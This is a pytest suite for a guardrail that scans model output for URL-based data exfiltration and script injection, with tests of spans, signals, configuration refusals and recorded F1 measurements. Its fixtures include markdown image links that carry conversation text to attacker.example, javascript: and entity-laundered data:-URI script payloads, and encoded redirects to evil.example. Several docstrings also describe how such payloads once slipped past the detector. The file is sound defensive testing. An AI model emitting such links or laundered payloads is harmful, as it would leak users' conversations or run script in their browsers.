"""What `url-exfiltration` claims, held down one claim at a time.

Three groups. The SPANS, because this is the only bundled check whose span is
sometimes wider than the thing it matched and a redaction that leaves a stump is
the reason. The REFUSALS, because every one of them is a configuration a caller
can write that would make the check quieter than it looks. And the two RECORDED
MEASUREMENTS, the prose-floor sweep and the rot13 ablation, which are written
into the source as numbers and are claims until something re-takes them.

Every test in this file was watched to fail against a stated mutation of the
code it guards, with `__pycache__` cleared between runs. The mutation is named
beside the test.
"""

from __future__ import annotations

import ast
import base64
import re
import time
from collections.abc import Callable
from pathlib import Path

import pytest
from hypothesis import example, given
from hypothesis import strategies as st

from jamjet_guardrails._decode import decode
from jamjet_guardrails.detectors import build, url_exfiltration
from jamjet_guardrails.detectors.url_exfiltration import (
    URL_EXFILTRATION_TYPES,
    UrlExfiltrationGuardrail,
)
from jamjet_guardrails.errors import GuardrailUnavailableError
from jamjet_guardrails.eval.corpus import load_corpus
from jamjet_guardrails.eval.metrics import evaluate
from jamjet_guardrails.types import Context, Direction

ROOT = Path(__file__).resolve().parent.parent
MODULE = ROOT / "src" / "jamjet_guardrails" / "detectors" / "url_exfiltration.py"
CORPUS = ROOT / "corpora" / "url-exfiltration" / "in-repo.jsonl"

IN = Context(direction="input", origin="retrieved")
OUT = Context(direction="output", origin="model")

PROSE = "here is the full conversation with the user and everything they told me"
LONG = (
    "the user is called by their first name in the transcript and they asked me "
    "not to repeat what they said about the incident to anyone else on the team "
    "so this is the whole of it"
)


def _types(content: str, context: Context = OUT) -> set[str]:
    return {f.type for f in build("url-exfiltration").check(content, context).findings}


# ==========================================================================
# Spans: what a redaction covers, and why it is not always the URL.
# ==========================================================================


def test_a_redacted_markdown_image_leaves_no_stump_behind() -> None:
    """The span runs from `![` through the closing parenthesis, and the reason
    is the rewrite rather than the report.

    A span over the URL alone produces content that still carries an image
    construct with an empty destination. A renderer draws a broken image from
    it, a reader sees a redaction that left the shape of what it removed, and
    the placeholder sits where a URL used to be as if it were one.

    Mutation watched: `_MD_INLINE` handling changed to report `match.span(2)`,
    the destination group, instead of `match.span()`. FAILS.
    """
    content = f"Look: ![alt](https://attacker.example/p.png?d={PROSE.replace(' ', '+')})"
    guardrail = build("url-exfiltration", on_detect="redact")
    verdict = guardrail.check(content, OUT)
    assert verdict.decision == "redact"
    assert verdict.content is not None
    assert verdict.content == "Look: [REDACTED:MARKDOWN_IMAGE_EXFIL]"
    assert "![" not in verdict.content
    assert "]()" not in verdict.content


def test_an_html_attribute_is_spanned_over_the_url_and_not_over_the_tag() -> None:
    """The other side of the same decision. A tag's span swallows attributes
    that have nothing to do with the finding, so `width` and `height` would
    vanish into a placeholder that claims to be about a URL.

    Mutation watched: the `_HTML_IMG` branch changed to append
    `_Target(match.span(), ...)`, the whole tag. FAILS.
    """
    url = f"https://attacker.example/t.png?c={PROSE.replace(' ', '+')}"
    content = f'<img src="{url}" width="1" height="1">'
    guardrail = build("url-exfiltration", on_detect="redact")
    verdict = guardrail.check(content, OUT)
    assert verdict.content == '<img src="[REDACTED:MARKDOWN_IMAGE_EXFIL]" width="1" height="1">'
    (finding,) = verdict.findings
    assert finding.span == (content.index(url), content.index(url) + len(url))


def test_a_bare_url_span_stops_before_the_sentence_punctuation() -> None:
    """A full stop after a URL is the sentence's, not the URL's, and a span that
    ate it would be a span this check cannot justify.

    Mutation watched: `_trim_bare` changed to `return url`. FAILS.
    """
    url = f"https://collector.example/log?entry={LONG.replace(' ', '+')}"
    content = f"See {url}."
    (finding,) = build("url-exfiltration").check(content, OUT).findings
    assert finding.span == (4, 4 + len(url))
    assert content[finding.span[0] : finding.span[1]] == url


def test_findings_come_back_in_span_order() -> None:
    """A precondition of `_spans._merge`, which tests each span against the
    running end of the region it is extending and looks no further back. The
    signals here run per URL and the URLs are found construct type by construct
    type, so the concatenation is in neither order until it is sorted.

    A deny never reaches the rewrite and `deny` is the default on output, so an
    unsorted return would stay invisible until a caller chose `redact`, which is
    exactly how the same defect stayed hidden in `injection-structural`.

    Mutation watched: the final `sorted(...)` in `_matches` replaced with the
    unsorted comprehension. FAILS.
    """
    content = (
        f'<a href="javascript:alert(1)">go</a> then ![x](https://a.example/p.png?d='
        f"{PROSE.replace(' ', '+')}) and [y](https://redir.example/go?u="
        f"{base64.b64encode(b'https://evil.example/steal').decode()})"
    )
    findings = build("url-exfiltration").check(content, OUT).findings
    spans = [f.span for f in findings]
    assert len(spans) == 3
    assert spans == sorted(spans)  # type: ignore[type-var]


# ==========================================================================
# The five signals, each on the property it claims and not on a host.
# ==========================================================================


def test_a_laundered_script_scheme_is_read_the_way_a_browser_reads_it() -> None:
    """Entities first, then ASCII whitespace and controls, because that is the
    order a browser applies: the HTML parser resolves the reference and the URL
    parser strips what it is handed. Doing it the other way leaves `&#9;` inside
    the scheme, where it reads as part of a hostname.

    Mutation watched: `_normalised_scheme` reduced to `return url`. FAILS on the
    second and third assertions.
    """
    assert _types("[go](javascript:alert(1))") == {"SCRIPT_SCHEME"}
    assert _types('<a href="java&#115;cript:alert(1)">go</a>') == {"SCRIPT_SCHEME"}
    assert _types('<a href="java\tscript:alert(1)">go</a>') == {"SCRIPT_SCHEME"}
    assert _types("[go](JaVaScRiPt:alert(1))") == {"SCRIPT_SCHEME"}
    assert _types("[go](vbscript:msgbox(1))") == {"SCRIPT_SCHEME"}


def test_a_data_uri_that_declares_an_image_and_holds_text_fires() -> None:
    """A declared image whose body is text is lying about itself. A declared
    image whose body is BYTES is an image, whether or not the signature table
    knows the format, so an unknown signature is not a signal.

    **A real PNG or JPEG is carried by the UTF-8 test, not by this table**, and
    the first version of this test did not know that: both bodies are invalid
    UTF-8, so deleting the signature table left them allowed and the mutation
    survived. The table earns its place exactly where a body is BOTH a valid
    image header and valid UTF-8, which an uncompressed BMP is, so that is the
    witness. The PNG stays in as the ordinary case.

    Mutation watched: deleted the `raw.startswith(_IMAGE_SIGNATURES)` early
    return from `_data_uri_payload`. FAILS on the BMP assertion.
    """
    text = base64.b64encode(b"this is not a png, it is a note for whoever reads it").decode()
    assert _types(f"![p](data:image/png;base64,{text})") == {"DATA_URI_PAYLOAD"}
    png = (
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8"
        "z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
    )
    assert _types(f"![p](data:image/png;base64,{png})") == set()
    bmp_body = b"BM" + bytes([0x36, 0x00, 0x00, 0x00]) + b"pixels and more pixels here"
    bmp = base64.b64encode(bmp_body).decode()
    assert bmp_body.decode("utf-8"), "the witness must survive a strict decode"
    assert _types(f"![b](data:image/bmp;base64,{bmp})") == set()


def test_active_content_inside_a_data_uri_fires_whatever_the_media_type_says() -> None:
    """A script, an `on*=` handler or a `javascript:` URL inside a data URI has
    one purpose. The handler test is a SHAPE and not a list of handler names,
    because a list's first omission is the one worth catching.

    Mutation watched: `_EVENT_HANDLER` narrowed to `\\bonload\\s*=`. FAILS on the
    `onclick` assertion.
    """
    assert _types("![i](data:image/svg+xml,%3Csvg%20onload%3D%27x()%27%3E%3C/svg%3E)") == {
        "DATA_URI_PAYLOAD"
    }
    assert _types("<a href=\"data:image/svg+xml,<svg><rect onclick='x()'/></svg>\">g</a>") == {
        "DATA_URI_PAYLOAD"
    }
    assert _types(
        "[o](data:text/html;base64," + base64.b64encode(b"<h1>x</h1>").decode() + ")"
    ) == {"DATA_URI_PAYLOAD"}
    plain = "%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%3E%3Crect/%3E%3C/svg%3E"
    assert _types(f"![i](data:image/svg+xml,{plain})") == set()


def test_a_nested_redirect_fires_on_an_encoded_inner_url_and_not_a_percent_encoded_one() -> None:
    """Encoding an inner URL serves no transport purpose: percent-encoding is
    what the query syntax already provides, and every framework that writes a
    `redirect_uri` writes it that way. Firing on the percent form denies every
    OAuth authorization link there is, so it is allowed BY DESIGN and disclosed
    rather than closed.

    Adding `"percent"` to the encodings `_nested_redirect` tries does NOT open
    this, and the first version of this test claimed it did. `_url_decoded` has
    already undone the percent layer by then, so a second percent decode finds no
    triplet and answers `None`. The mutation that opens it is testing the
    url-decoded component itself against the absolute-URL pattern, which is what
    "fire on a percent-encoded redirect" actually means.

    Mutation watched: added `if _ABSOLUTE_URL.match(plain): return True` at the
    top of `_nested_redirect`'s loop body. FAILS on the last assertion.
    """
    inner = "https://evil.example/steal"
    b64 = base64.b64encode(inner.encode()).decode()
    assert _types(f"[l](https://redir.example/go?u={b64})") == {"NESTED_REDIRECT"}
    assert _types(f"[l](https://redir.example/go?u={inner.encode().hex()})") == {"NESTED_REDIRECT"}
    assert _types("[l](https://redir.example/go?u=https%3A%2F%2Fdocs.example.com%2Fguide)") == set()


def test_the_link_query_payload_fires_on_output_only() -> None:
    """A long prose query on a non-image link is an exfiltrated conversation
    when a model wrote it and a search, a share or a prefilled issue when a user
    or a page did. The corpus cannot express that on its own, so it is contract
    written in `docs/conformance.md` and held here.

    Mutation watched: removed the `direction == "output"` condition from
    `_matches`. FAILS on the input assertion.
    """
    content = f"See [more](https://collector.example/log?entry={LONG.replace(' ', '+')})"
    assert _types(content, OUT) == {"LINK_QUERY_PAYLOAD"}
    assert _types(content, IN) == set()


def test_the_check_carries_no_host_list_anywhere_in_its_code() -> None:
    """Decision 9 of the phase-3 design, held against the code rather than
    against the module's own paragraph saying so.

    An exemption that approximates a set of trusted hosts with a shape is
    chainable, and chaining it turns it into the channel. The failure mode this
    guards is not a designed allowlist: it is one benign-looking constant added
    to silence a false positive somebody hit in production.

    String constants only, docstrings excluded, so the module may go on
    explaining what it does not do.

    Mutation watched: added `_SAFE_HOSTS = frozenset({"github.com"})` to the
    module. FAILS.
    """
    tree = ast.parse(MODULE.read_text(encoding="utf-8"))
    docstrings = {
        id(node.body[0].value)
        for node in ast.walk(tree)
        if isinstance(node, (ast.Module, ast.ClassDef, ast.FunctionDef))
        and node.body
        and isinstance(node.body[0], ast.Expr)
        and isinstance(node.body[0].value, ast.Constant)
        and isinstance(node.body[0].value.value, str)
    }
    domain = re.compile(r"\b[a-z0-9][a-z0-9-]*\.(com|net|org|io|dev|co|ai|example|test)\b")
    offenders = [
        node.value
        for node in ast.walk(tree)
        if isinstance(node, ast.Constant)
        and isinstance(node.value, str)
        and id(node) not in docstrings
        and domain.search(node.value)
    ]
    assert offenders == [], f"the module carries host literals in its code: {offenders}"


# ==========================================================================
# The two fail-opens a whole-branch review found after this check shipped,
# and the cost of the pass that finds the URLs in the first place.
# ==========================================================================


def test_a_url_whose_authority_ends_at_the_question_mark_still_has_a_query() -> None:
    """`https://host?q=...` carries no path, RFC 3986 permits it and every
    browser resolves it to `https://host/?q=...`.

    `_url_parts` used to look for the query only inside what followed the first
    `/`, so an authority not followed by one swallowed the whole query string
    and the authority is then discarded. Three of the five signals read nothing
    but the components, so deleting ONE character from an attacker's URL took
    MARKDOWN_IMAGE_EXFIL, LINK_QUERY_PAYLOAD and NESTED_REDIRECT out of the
    check at once. No case in the 88-case corpus put a `?` before the first `/`,
    so the published row could not see it; `url-0089`, `url-0090` and `url-0091`
    are what it costs now.

    Mutation watched: `_AUTHORITY_END` narrowed from `[/?]` to `[/]`, which is
    the parse this replaced. FAILS on the first assertion, and on all four
    signal assertions.
    """
    assert url_exfiltration._url_parts("https://a.example?d=abc") == ([], ["d", "abc"])
    assert url_exfiltration._url_parts("https://a.example/?d=abc") == ([], ["d", "abc"])
    assert url_exfiltration._url_parts("https://a.example?d=abc#f") == ([], ["d", "abc"])

    payload = PROSE.replace(" ", "%20")
    inner = base64.b64encode(b"https://evil.example/collect").decode()
    for authority in ("https://a.example/p.png", "https://a.example"):
        assert _types(f"![x]({authority}?d={payload})") == {"MARKDOWN_IMAGE_EXFIL"}
    for authority in ("https://r.example/go", "https://r.example"):
        assert _types(f"[l]({authority}?u={inner})") == {"NESTED_REDIRECT"}
    for authority in ("https://c.example/log", "https://c.example"):
        entry = LONG.replace(" ", "+")
        assert _types(f"See [more]({authority}?entry={entry})") == {"LINK_QUERY_PAYLOAD"}

    # The false-reject control. A query is not a finding, and an authority with
    # no path is the shape half the tracking links on the web have.
    assert _types("[notes](https://docs.example.com?utm_source=newsletter&page=2)") == set()


def test_the_signals_read_the_url_the_consumer_resolves_and_not_only_the_raw_one() -> None:
    """`_normalised_scheme` unescapes entities before it reads a scheme, and its
    docstring gives the reason: the HTML parser resolves the reference and the
    URL parser is handed the result. One line below that call, the data-URI test
    and the component parse were given the RAW string, so laundering any of the
    five characters `data:` defeated DATA_URI_PAYLOAD outright, the `_HTTP_SCHEME`
    gate then dropped the target, and laundering the `?` hid the query string
    from the three signals that read components.

    The corpus had exactly one entity-laundered case, `url-0019`, and it pinned
    the normalisation for SCRIPT_SCHEME and for nothing else: a corpus too small
    to see the bug it was written for. `url-0092`, `url-0093` and `url-0094` are
    the rest of it.

    Mutation watched: `_consumer_views` reduced to `return (url,)`. FAILS on
    every laundered assertion below and on none of the controls.
    """
    script = "<script>alert(1)</script>"
    for laundered in ("dat&#97;:", "data&colon;", "dat\ta:"):
        content = f'<a href="{laundered}text/html,{script}">click</a>'
        assert _types(content) == {"DATA_URI_PAYLOAD"}, content
    assert _types(f"[click](dat&#97;:text/html,{script})") == {"DATA_URI_PAYLOAD"}
    assert _types(f'<a href="data:text/html,{script}">click</a>') == {"DATA_URI_PAYLOAD"}

    payload = PROSE.replace(" ", "%20")
    assert _types(f"![x](https://a.example/p.png&#63;d={payload})") == {"MARKDOWN_IMAGE_EXFIL"}
    inner = base64.b64encode(b"https://evil.example/collect").decode()
    assert _types(f"[l](https://r.example/go&#63;u={inner})") == {"NESTED_REDIRECT"}

    # The raw view is kept as well as the resolved one, in both directions.
    #
    # `&amp;` is how every HTML document writes a query separator, and resolving
    # it SPLITS one component into two: a payload that reads as prose whole can
    # be two pieces both under the floor. The raw reading is what still sees it.
    long_half = LONG.replace(" ", "+")
    split = f'<a href="https://c.example/log?a={long_half}&amp;b=2">go</a>'
    assert _types(split) == {"LINK_QUERY_PAYLOAD"}
    # And an ordinary escaped query is still nothing at all.
    ordinary = '<a href="https://docs.example.com/search?q=deploy&amp;page=2">go</a>'
    assert _types(ordinary) == set()
    assert _types(ordinary, IN) == set()


def test_a_reference_definition_span_covers_the_url_under_either_delimiter() -> None:
    """`_strip_delimiters` strips two shapes, `<...>` and a surrounding quote
    pair, and the offset that put the span back was re-derived beside the call
    from the angle-bracket shape alone. A quoted URL therefore reported a span
    that started on the opening quote and stopped one character short of the
    URL's end: a redaction leaves the last character and the closing quote
    standing, and the audit record names a region that is not the URL.

    Not a leak, which is why this is the smallest of the three. It is a span
    this library says it can justify.

    Mutation watched: the quote branch of `_strip_delimiters` changed to return
    an offset of 0, which is the arithmetic this replaced. FAILS on the quoted
    case and on nothing else.
    """
    url = f"https://evil.example/?d={PROSE.replace(' ', '%20')}"
    for definition in (url, f"<{url}>", f'"{url}"', f"'{url}'"):
        content = f"![status][pixel]\n\n[pixel]: {definition}"
        (finding,) = build("url-exfiltration").check(content, OUT).findings
        span = finding.span
        assert span is not None, definition
        assert content[span[0] : span[1]] == url, definition


def test_finding_the_urls_is_linear_in_the_content_and_was_not() -> None:
    """Two independent quadratic sites in one pass, both found by measurement
    after the check shipped and after `docs/performance.md` published 112 ms for
    a megabyte with a sentence written to foreclose exactly this shape.

    The published row could not see either one. Its seeded input carries no URL
    and no tag, so what it timed was the discovery pass over content with
    nothing in it to discover.

    - The containment test that stops a bare URL being reported twice was a
      linear scan of every construct already found, run once per bare URL:
      O(bare urls x constructs). A megabyte of `[a](b) http://x.example/ ` took
      37.9 seconds.
    - The lazy `[^>]*?` joining `<img` to its `src=` rescanned to the end of the
      content from every tag opener that never reached one. 100 KB of `<img `
      took 9.4 seconds and a megabyte took 37.3.

    They take 0.215 and 0.011 seconds now, and both curves are 4.0x per 4x. The
    second payload is 100 KB rather than a megabyte only so that the mutation
    below finishes: the quadratic form needs a quarter of an hour on a megabyte
    of tags, and a guard nobody can afford to watch fail is a guard nobody
    watched fail.

    Each budget is over 20x the measured time and under a fifth of what the
    quadratic form needed at the same size, following the same reasoning as
    `tests/test_pii.py::test_the_email_pattern_does_not_degrade_quadratically`:
    loose enough not to flake on a loaded runner, and nowhere near loose enough
    to let either shape back in. It is not a performance gate. `docs/performance.md`
    says why there is no such thing here.

    Mutation watched: `_targets` restored to `if any(low <= start and end <= high
    for low, high in covered)`. FAILS on the first budget, at 34 seconds.
    Separately, `_html_attributes` replaced by a `finditer` over the
    single-regex form it took the place of, which is the one kept below this
    test. FAILS on the second budget, at 9.4 seconds.
    """
    guardrail = build("url-exfiltration")

    mixed = "[a](b) http://x.example/ " * 41_943
    assert len(mixed) > 1_000_000
    start = time.perf_counter()
    assert guardrail.check(mixed, IN).decision == "allow"
    elapsed = time.perf_counter() - start
    assert elapsed < 5.0, f"markdown plus bare URLs took {elapsed:.2f}s over {len(mixed)} chars"

    tags = "<img " * 20_000
    assert len(tags) == 100_000
    start = time.perf_counter()
    assert guardrail.check(tags, IN).decision == "allow"
    elapsed = time.perf_counter() - start
    assert elapsed < 2.0, f"unterminated tags took {elapsed:.2f}s over {len(tags)} chars"


_HTML_IMG_ONE_REGEX = re.compile(
    r"<img\b[^>]*?\bsrc\s*=\s*(\"[^\"]*\"|'[^']*'|[^\s>]+)", re.IGNORECASE
)
_HTML_A_ONE_REGEX = re.compile(
    r"<a\b[^>]*?\bhref\s*=\s*(\"[^\"]*\"|'[^']*'|[^\s>]+)", re.IGNORECASE
)


# Tag soup, in the pieces a tag is made of rather than one character at a time:
# a character alphabet reaches `<img src=` only by accident, and it is the
# pieces that make the two implementations disagree.
_TAG_SOUP = st.lists(
    st.sampled_from(["<", ">", '"', "'", " ", "=", "/", "a", "img", "src", "href", "x", "\n"]),
    max_size=20,
).map("".join)


@given(_TAG_SOUP)
@example('<img <img src="x">')
@example('<img alt="a>b" src="x">')
@example('<a href="x" href="y">')
@example("<img src=x src=y>")
@example("<img>src=x")
@example("<a\nhref='x'>")
@example("<img src=")
@example('<img src="unterminated')
def test_the_linear_attribute_join_answers_what_the_one_regex_answered(content: str) -> None:
    """The rewrite that killed the second quadratic site has to be the same
    FUNCTION, not merely a faster one, because these spans are what a redaction
    covers and what an audit record names.

    So the regex it replaced is kept here and both are run over generated tag
    soup: same tag starts, same attribute spans, same order, same non-overlap.
    A property rather than a case list, for the reason
    `tests/test_properties.py` gives at its own: every Critical this package has
    recorded was a class of input nobody wrote down.

    Mutation watched: the `bisect_left(opens, resume)` term dropped from the
    index in `_html_attributes`, which is the non-overlap rule. FAILS on
    `<img src=x src=y>`.
    """
    closes = [match.start() for match in url_exfiltration._HTML_CLOSE.finditer(content)]
    for opener, attribute, reference in (
        (url_exfiltration._HTML_OPEN_IMG, url_exfiltration._HTML_SRC, _HTML_IMG_ONE_REGEX),
        (url_exfiltration._HTML_OPEN_A, url_exfiltration._HTML_HREF, _HTML_A_ONE_REGEX),
    ):
        linear = [
            (tag, match.span(1), match.group(1))
            for tag, match in url_exfiltration._html_attributes(content, opener, attribute, closes)
        ]
        regex = [
            (match.start(), match.span(1), match.group(1)) for match in reference.finditer(content)
        ]
        assert linear == regex, content


# ==========================================================================
# The refusals: every configuration that would check less than it says.
# ==========================================================================


@pytest.mark.parametrize(
    ("build_it", "match"),
    [
        (lambda: UrlExfiltrationGuardrail(types=frozenset()), "no finding types"),
        (lambda: UrlExfiltrationGuardrail(directions=frozenset()), "no direction it can run in"),
        (
            lambda: UrlExfiltrationGuardrail(
                types={"LINK_QUERY_PAYLOAD"}, directions=frozenset({"input"})
            ),
            "never report anything",
        ),
        (
            lambda: UrlExfiltrationGuardrail(on_detect={"output": "deny"}),
            "names no decision for",
        ),
        (
            lambda: UrlExfiltrationGuardrail(
                on_detect={"input": "redact", "output": "deny"},
                directions=frozenset({"output"}),
            ),
            "would never be asked about",
        ),
        (
            lambda: UrlExfiltrationGuardrail(directions=frozenset({"sideways"})),  # type: ignore[arg-type]
            "never carries these",
        ),
    ],
)
def test_a_configuration_that_would_check_less_is_refused_at_construction(
    build_it: Callable[[], UrlExfiltrationGuardrail], match: str
) -> None:
    """Six shapes of one mistake, and the error type is the one a caller already
    wraps their configuration seam in.

    The third is the one no other check has: `LINK_QUERY_PAYLOAD` fires on
    output only, so selecting it alone alongside `directions={"input"}` builds a
    guardrail that runs on every message and can never report anything. That is
    `build`'s "configured and silent" refusal reached through a combination of
    two options that are each individually fine.

    Mutation watched: deleted the `selected <= _OUTPUT_ONLY` refusal. FAILS on
    the third case only, which is what makes the parametrisation worth having.
    """
    with pytest.raises(GuardrailUnavailableError, match=match):
        build_it()


@pytest.mark.parametrize(
    ("build_it", "match"),
    [
        (lambda: UrlExfiltrationGuardrail(types={"NOT_A_TYPE"}), "unknown finding type"),
        (lambda: UrlExfiltrationGuardrail(types="SCRIPT_SCHEME"), "iterable of its own"),
        (lambda: UrlExfiltrationGuardrail(on_detect="allow"), "must be 'redact' or 'deny'"),
    ],
)
def test_an_option_outside_its_domain_raises_a_value_error(
    build_it: Callable[[], UrlExfiltrationGuardrail], match: str
) -> None:
    """A bad ARGUMENT is not an unavailable check, and `detectors.build`
    deliberately does not wrap a detector's own `ValueError`. The bare-string
    case is the one that would otherwise pass silently: `types="SCRIPT_SCHEME"`
    iterates as fifteen one-character type names, every one of them unknown.

    Mutation watched: deleted the `isinstance(types, (str, bytes))` refusal. The
    second case still fails, on the unknown-type message rather than the
    string one, so the assertion is on the MESSAGE and not only on the type.
    """
    with pytest.raises(ValueError, match=match):
        build_it()


def test_check_refuses_a_direction_the_guardrail_does_not_declare() -> None:
    """The chain filters directions before calling `check`; a caller holding one
    guardrail does not. Answering `allow` there would report that content had
    been checked in a direction this guardrail never declared.

    Mutation watched: deleted the direction guard at the top of `check`. FAILS.
    """
    guardrail = UrlExfiltrationGuardrail(directions=frozenset({"output"}))
    with pytest.raises(GuardrailUnavailableError, match="declares only"):
        guardrail.check("hello", IN)


def test_the_default_decision_differs_by_direction() -> None:
    """The first bundled check whose default is not one decision. Output is the
    enforcement point and denies; on input the URL is an instrument in a page
    somebody is asking about, so redacting keeps the page and the question.

    Mutation watched: `_DEFAULT_ON_DETECT` changed to `{"output": "deny",
    "input": "deny"}`. FAILS.
    """
    content = f"![x](https://attacker.example/p.png?d={PROSE.replace(' ', '+')})"
    guardrail = build("url-exfiltration")
    assert guardrail.check(content, OUT).decision == "deny"
    assert guardrail.check(content, IN).decision == "redact"
    assert guardrail.check("nothing to see here", OUT).decision == "allow"


def test_the_default_policy_narrows_to_the_directions_that_were_declared() -> None:
    """A caller who narrows `directions` and writes no policy at all must not be
    told their policy names a direction they did not declare.

    The default names both directions because both are declared by default, and
    running it through the same extra-key refusal a caller's mapping gets made
    `directions=frozenset({"output"})` unbuildable. That is the refusal doctrine
    firing on the absence of a configuration, which is the one case it must not
    reach: nothing was configured, so nothing can be checking less than it says.

    Mutation watched: restored the single `policy = _DEFAULT_ON_DETECT if
    on_detect is None else on_detect` line, so the default runs through the
    mapping branch. FAILS.
    """
    both: tuple[frozenset[Direction], ...] = (frozenset({"output"}), frozenset({"input"}))
    for directions in both:
        guardrail = UrlExfiltrationGuardrail(directions=directions)
        assert guardrail.directions == directions
    content = f"![x](https://attacker.example/p.png?d={PROSE.replace(' ', '+')})"
    assert (
        UrlExfiltrationGuardrail(directions=frozenset({"input"})).check(content, IN).decision
        == "redact"
    )
    assert (
        UrlExfiltrationGuardrail(directions=frozenset({"output"})).check(content, OUT).decision
        == "deny"
    )


def test_selecting_a_subset_of_types_reports_only_that_subset() -> None:
    """The option exists so a deployment can take the signals it wants, and the
    failure that matters is the opposite of a refusal: a `types` argument that
    is accepted and then ignored.

    Mutation watched: `claim` changed to record every type regardless of
    `self._types`. FAILS.
    """
    content = "[go](javascript:alert(1)) and [o](data:text/html,<h1>x</h1>)"
    assert _types(content) == {"SCRIPT_SCHEME", "DATA_URI_PAYLOAD"}
    narrow = build("url-exfiltration", types={"SCRIPT_SCHEME"})
    assert {f.type for f in narrow.check(content, OUT).findings} == {"SCRIPT_SCHEME"}


# ==========================================================================
# The recorded measurements.
# ==========================================================================


def _f1_with_prose_floor(attribute: str, value: int) -> float:
    original = getattr(url_exfiltration, attribute)
    setattr(url_exfiltration, attribute, value)
    try:
        corpus = load_corpus(CORPUS, name="url-exfiltration/in-repo")
        return round(evaluate(build("url-exfiltration"), corpus).overall.f1, 4)
    finally:
        setattr(url_exfiltration, attribute, original)


@pytest.mark.parametrize(
    ("attribute", "value", "plateau_top", "below", "above"),
    [
        ("_IMAGE_PROSE_FLOOR", 30, 64, 0.9114, 0.9091),
        ("_LINK_PROSE_FLOOR", 136, 176, 0.9114, 0.8493),
    ],
)
def test_each_prose_floor_is_the_smallest_value_reaching_the_best_f1(
    attribute: str, value: int, plateau_top: int, below: float, above: float
) -> None:
    """Unlike the four alphabet floors these two curves are not flat, so the
    sweep really does choose them and both sides cost something measured. The
    table in the module records exactly these five numbers per floor.

    Mutation watched: `_LINK_PROSE_FLOOR` changed from 136 to 120. FAILS on the
    link case, at the shipped-value assertion.
    """
    assert getattr(url_exfiltration, attribute) == value
    baseline = 0.9231
    assert _f1_with_prose_floor(attribute, value) == baseline
    assert _f1_with_prose_floor(attribute, plateau_top) == baseline
    assert _f1_with_prose_floor(attribute, value - 1) == below
    assert _f1_with_prose_floor(attribute, plateau_top + 1) == above


def test_rot13_buys_two_positives_and_costs_no_precision(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The ablation `_decode`'s docstring publishes, re-taken.

    Rot13 is the one alphabet with nothing to recognise it by, so it was shipped
    on a measurement rather than on an argument: removing it from the readings
    this check takes of a URL component, with nothing else changed, loses two
    true positives and returns no precision, over 55 negatives that are almost
    entirely ordinary English and therefore rot13 candidates every one.

    Mutation watched: `_decode_rot13` changed to `return None`. FAILS on the
    first assertion block, because the shipped row becomes the ablated one.

    Rotating unconditionally instead does NOT fail here, and that is worth
    recording rather than hiding: this consumer re-applies `is_prose` to every
    reading, so a rot13 decoder that answered for every alphabetic run would
    hand it gibberish and change nothing. The two-sided test is a property of
    `decode`'s contract, held in `tests/test_decode.py`, not of what this check
    does with it.
    """
    corpus = load_corpus(CORPUS, name="url-exfiltration/in-repo")
    shipped = evaluate(build("url-exfiltration"), corpus)
    assert (
        round(shipped.overall.precision, 4),
        round(shipped.overall.recall, 4),
        shipped.overall.false_positives,
        shipped.decision_mismatches,
    ) == (0.9231, 0.9231, 3, 6)

    original = url_exfiltration._readings

    def without_rot13(component: str) -> list[str]:
        return [text for text in original(component) if text != _rot13(component)]

    def _rot13(component: str) -> str | None:
        return decode(url_exfiltration._url_decoded(component), "rot13")

    monkeypatch.setattr(url_exfiltration, "_readings", without_rot13)
    ablated = evaluate(build("url-exfiltration"), corpus)
    assert (
        round(ablated.overall.precision, 4),
        round(ablated.overall.recall, 4),
        ablated.overall.false_positives,
        ablated.decision_mismatches,
    ) == (0.9189, 0.8718, 3, 8)

    lost = {f.case_id for f in ablated.failures} - {f.case_id for f in shipped.failures}
    assert lost == {"url-0071", "url-0072"}


def test_every_declared_type_is_reachable_from_this_module() -> None:
    """`TYPES` is what the README row and the corpus completeness test read, and
    a type nobody can produce is a capability nobody measured. The completeness
    test asserts the corpus labels each one; this asserts the CODE claims each
    one, which is the half that would survive deleting a signal.

    Mutation watched: deleted the `claim(target, "NESTED_REDIRECT")` call.
    FAILS.
    """
    source = MODULE.read_text(encoding="utf-8")
    body = source.split('"""', 2)[2]
    for type_name in sorted(URL_EXFILTRATION_TYPES):
        assert f'claim(target, "{type_name}")' in body, f"nothing claims {type_name}"
